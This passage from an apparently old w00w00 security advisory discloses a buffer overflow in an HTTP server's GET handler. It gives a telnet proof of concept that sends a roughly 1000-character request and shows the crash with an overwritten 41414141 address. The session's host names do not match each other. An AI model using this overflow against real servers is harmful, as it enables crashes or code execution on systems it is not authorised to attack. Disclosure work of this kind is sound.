handles GET commands
has an unchecked buffer that will allow arbitrary code to be executed
if it is overflowed.

Do you do the w00w00?
This advisory also acts as part of w00giving. This is another
contribution
to w00giving for all you w00nderful people out there. You do know
what
w00giving is don't you? http://www.w00w00.org/advisories.html

Example
[hell@imahacker]$ telnet die.communitech.net 80
Trying example.com...
Connected to die.communitech.net
Escape character is '^]'.
GET (buffer) HTTP/1.1 <enter><enter>

Where [buffer] is aprox. 1000 characters. At his point the server
overflows.

And in remote machine someone will be see something like this.

HTTP caused an invalid page fault in
module <unknown> at 0000:41414141.
